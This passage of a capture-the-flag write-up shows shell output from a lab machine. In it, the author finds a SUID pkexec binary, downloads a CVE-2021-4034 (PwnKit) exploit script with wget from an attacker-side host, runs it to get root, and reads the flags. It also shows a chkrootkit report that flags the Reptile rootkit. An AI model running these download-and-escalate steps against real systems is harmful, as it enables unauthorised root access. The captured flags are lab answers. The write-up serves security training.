  Usage of /:                       65.0% of 7.52GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        270
  Users logged in:                  0
  IPv4 address for br-60af0c740c74: 172.22.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.13.37.14
  IPv6 address for ens160:          dead:beef::250:56ff:feb0:9f7c

  => There are 2 zombie processes.
You have mail.
Last login: Sat May  3 06:28:27 2025 from 10.10.14.10

administrator@erlenmeyer:~$ id
uid=1000(administrator) gid=1000(administrator) groups=1000(administrator)
administrator@erlenmeyer:~$ ls -la
total 76
drwxr-xr-x 6 administrator administrator  4096 May  3 06:32  .
drwxr-xr-x 5 root          root           4096 Jul 20  2021  ..
lrwxrwxrwx 1 root          root              9 Sep 14  2021  .bash_history -> /dev/null
-rw-r--r-- 1 administrator administrator   220 Feb 25  2020  .bash_logout
-rw-r--r-- 1 administrator administrator  3808 Jul 22  2021  .bashrc
drwx------ 2 administrator administrator  4096 Jul 16  2021  .cache
-rw-rw-r-- 1 administrator administrator  3262 May  2 19:27  cve.py
drwxrwxr-x 2 administrator administrator  4096 May  2 19:27  exploit
drwxrwxr-x 2 administrator administrator  4096 May  2 19:27 'GCONV_PATH=.'
drwxrwxr-x 3 administrator administrator  4096 May  2 19:27  .local
-rwxr-xr-x 1 administrator administrator   431 May  3 06:28  payload.so
-rw-r--r-- 1 administrator administrator   807 Feb 25  2020  .profile
-rw-r--r-- 1 administrator administrator    65 Jul 22  2021  .pythonrc
-rw-rw-r-- 1 administrator administrator   570 May  3 06:32  Reptile
-rw-r--r-- 1 administrator administrator     0 Jul 22  2021  .sudo_as_admin_successful
-rwxr-xr-- 1 root          root          22824 Jul 21  2021  tcp-server
administrator@erlenmeyer:~$ sudo su --
[sudo] password for administrator: 
administrator is not in the sudoers file.  This incident will be reported.
administrator@erlenmeyer:~$ find / -perm -4000 2>/dev/null
/snap/core18/2074/bin/mount
/snap/core18/2074/bin/ping
/snap/core18/2074/bin/su
/snap/core18/2074/bin/umount
/snap/core18/2074/usr/bin/chfn
/snap/core18/2074/usr/bin/chsh
/snap/core18/2074/usr/bin/gpasswd
/snap/core18/2074/usr/bin/newgrp
/snap/core18/2074/usr/bin/passwd
/snap/core18/2074/usr/bin/sudo
/snap/core18/2074/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2074/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
/snap/snapd/12398/usr/lib/snapd/snap-confine
/snap/snapd/12704/usr/lib/snapd/snap-confine
/usr/bin/umount
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec <<<<<<<< "Founded"
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
administrator@erlenmeyer:~$ ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
```

And thats worked we found classic one `suid` `pkexec`. Now we will use CVE-2021-4034 to get root privilege and read the flag.
- [SUID](https://gtfobins.github.io/)
- [pkexec](https://github.com/ly4k/PwnKit.git)
- [CVE-2021-4034 exploit](https://github.com/joeammond/CVE-2021-4034)

```shell
administrator@erlenmeyer:~$ cd /tmp
administrator@erlenmeyer:/tmp$ wget http://10.10.16.4:8000/CVE-2021-4034.py
--2025-05-12 17:47:41--  http://10.10.16.4:8000/CVE-2021-4034.py
Connecting to 10.10.16.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3262 (3.2K) [text/x-python]
Saving to: ‘CVE-2021-4034.py’

CVE-2021-4034.py                100%[=====================================================>]   3.19K  --.-KB/s    in 0.01s   

2025-05-12 17:47:42 (315 KB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]
administrator@erlenmeyer:/tmp$ python3 CVE-2021-4034.py 
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=1000(administrator) groups=1000(administrator)
# /bin/bash
root@erlenmeyer:/tmp# cd /root
root@erlenmeyer:/root# whoami
root
root@erlenmeyer:/root# ls -la
total 14376
drwx------  7 root root              4096 May  2 19:39 .
drwxr-xr-x 21 root root              4096 Sep 14  2021 ..
-rw-r--r--  1 root root              3158 Jul 22  2021 .bashrc
drwx------  2 root root              4096 Sep  2  2021 .cache
-rw-r--r--  1 root root               176 Jul 16  2021 .profile
-rw-r--r--  1 root root                65 Jul 22  2021 .pythonrc
drwx------  2 root root              4096 Jul 16  2021 .ssh
-rw-r-----  1 root administrator 14660078 Sep 13  2021 access.log
-rw-r--r--  1 root root              9430 Jul 20  2021 chkrootkit.txt
drwxr-xr-x  2 root root              4096 Jul 21  2021 exploitme
-rw-r--r--  1 root root                40 Jul 22  2021 flag.txt
drwxr-xr-x  4 root root              4096 Jul 16  2021 snap
drwxr-xr-x  4 root root              4096 Jul 16  2021 web
root@erlenmeyer:/root# cat flag.txt
FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}
```
### Administrator View
```FARADAY{__1s_pR1nTf_Tur1ng_c0mPl3t3?__}```

# Rootkit

In /root we find a .txt file that seems to be the output of chkrootkit, in this file it shows us that the rootkit Reptileis present on this machine

```bash
root@erlenmeyer:/root# cat chkrootkit.txt 
ROOTDIR is `/'
Checking `amd'...                                           not found
Checking `basename'...                                      not infected
Checking `biff'...                                          not found
Checking `chfn'...                                          not infected
Checking `chsh'...                                          not infected
Checking `cron'...                                          not infected
Checking `crontab'...                                       not infected
Checking `date'...                                          not infected
Checking `du'...                                            not infected
Checking `dirname'...                                       not infected
Checking `echo'...                                          not infected
Checking `egrep'...                                         not infected
Checking `env'...                                           not infected
Checking `find'...                                          not infected
Checking `fingerd'...                                       not found
Checking `gpm'...                                           not found
Checking `grep'...                                          not infected
Checking `hdparm'...                                        not infected
Checking `su'...                                            not infected
Checking `ifconfig'...                                      not infected
Checking `inetd'...                                         not infected
Checking `inetdconf'...                                     not found
Checking `identd'...                                        not found
Checking `init'...                                          not infected
Checking `killall'...                                       not infected
Checking `ldsopreload'...                                   not infected
Checking `login'...                                         not infected
Checking `ls'...                                            not infected
Checking `lsof'...                                          not infected
Checking `mail'...                                          not infected
Checking `mingetty'...                                      not found
Checking `netstat'...                                       not infected
Checking `named'...                                         not found
Checking `passwd'...                                        not infected
Checking `pidof'...                                         not infected
Checking `pop2'...                                          not found
Checking `pop3'...                                          not found
Checking `ps'...                                            not infected
Checking `pstree'...                                        not infected
Checking `rpcinfo'...                                       not found
Checking `rlogind'...                                       not found
Checking `rshd'...                                          not found
Checking `slogin'...                                        not infected
Checking `sendmail'...                                      not infected
Checking `sshd'...                                          not found
Checking `syslogd'...                                       not tested
Checking `tar'...                                           not infected
Checking `tcpd'...                                          not found
Checking `tcpdump'...                                       not infected
Checking `top'...                                           not infected
Checking `telnetd'...                                       not found
Checking `timed'...                                         not found
Checking `traceroute'...                                    not found
Checking `vdir'...                                          not infected
Checking `w'...                                             not infected
Checking `write'...                                         not infected
Checking `aliens'...                                        no suspect files
Searching for sniffer's logs, it may take a while...        nothing found
Searching for rootkit HiDrootkit's default files...         nothing found
Searching for rootkit t0rn's default files...               nothing found
Searching for t0rn's v8 defaults...                         nothing found
Searching for rootkit Lion's default files...               nothing found
Searching for rootkit RSHA's default files...               nothing found
Searching for rootkit RH-Sharpe's default files...          nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... The following suspicious files and directories were found:  
/usr/lib/debug/.build-id /usr/lib/modules/5.4.0-42-generic/vdso/.build-id
/usr/lib/debug/.build-id /usr/lib/modules/5.4.0-42-generic/vdso/.build-id
Searching for LPD Worm files and dirs...                    nothing found
Searching for Ramen Worm files and dirs...                  nothing found
Searching for Maniac files and dirs...                      nothing found
Searching for RK17 files and dirs...                        nothing found
Searching for Ducoci rootkit...                             nothing found
Searching for Adore Worm...                                 nothing found
Searching for ShitC Worm...                                 nothing found
Searching for Omega Worm...                                 nothing found
Searching for Sadmind/IIS Worm...                           nothing found
Searching for MonKit...                                     nothing found
Searching for Showtee...                                    nothing found
Searching for OpticKit...                                   nothing found
Searching for T.R.K...                                      nothing found
Searching for Mithra...                                     nothing found
Searching for LOC rootkit...                                nothing found
Searching for Romanian rootkit...                           nothing found
Searching for Suckit rootkit...                             nothing found
Searching for Volc rootkit...                               nothing found
Searching for Gold2 rootkit...                              nothing found
Searching for TC2 Worm default files and dirs...            nothing found
Searching for Anonoying rootkit default files and dirs...   nothing found
Searching for ZK rootkit default files and dirs...          nothing found
Searching for ShKit rootkit default files and dirs...       nothing found
Searching for AjaKit rootkit default files and dirs...      nothing found
Searching for zaRwT rootkit default files and dirs...       nothing found
Searching for Madalin rootkit default files...              nothing found
Searching for Fu rootkit default files...                   nothing found
Searching for ESRK rootkit default files...                 nothing found
Searching for rootedoor...                                  nothing found
Searching for Reptile Rootkit...                            found it
Searching for ENYELKM rootkit default files...              nothing found
Searching for common ssh-scanners default files...          nothing found
Searching for Linux/Ebury - Operation Windigo ssh...        nothing found 
Searching for 64-bit Linux Rootkit ...                      nothing found
Searching for 64-bit Linux Rootkit modules...               nothing found
Searching for Mumblehard Linux ...                          nothing found
Searching for Backdoor.Linux.Mokes.a ...                    nothing found
-------------------------SNIP---------------------------

root@erlenmeyer:~# lsblk
NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0  55.5M  1 loop /snap/core18/2074
loop1                       7:1    0  55.4M  1 loop /snap/core18/1944
loop2                       7:2    0 131.6M  1 loop /snap/docker/796
loop3                       7:3    0  70.3M  1 loop /snap/lxd/21029
loop4                       7:4    0  32.3M  1 loop /snap/snapd/12398
loop5                       7:5    0  67.6M  1 loop /snap/lxd/20326
loop6                       7:6    0  32.3M  1 loop /snap/snapd/12704
sda                         8:0    0    10G  0 disk 
├─sda1                      8:1    0     1M  0 part 
├─sda2                      8:2    0   200M  0 part /boot
└─sda3                      8:3    0   9.8G  0 part 
  ├─ubuntu--vg-ubuntu--lv 253:0    0   7.7G  0 lvm  /
  └─ubuntu--vg-swap       253:1    0     2G  0 lvm  [SWAP]

```

When a Linux system is installed, the disk (/dev/sda) is split into partitions:
/dev/sda1 → could be /boot
/dev/sda2 → could be swap
/dev/sda3 → is often / (root)

Reptile rootkit is installed in kernel space. So, copying /dev/sda3 gives us entire root directory. No Need to Copy Entire Disk if Only / is Affected.

![](./Images/rootkit5.png)
sda3 contains the root filesystem But not directly, it contains an LVM volume group (ubuntu--vg), which in turn contains a logical volume mounted at /

![](./Images/rootkit.png)

![](./Images/rootkit2.png)

![](./Images/rootkit3.png)

### Rootkit
```FARADAY{__LKM-is-a-l0t-l1k3-an-0r@ng3__}```

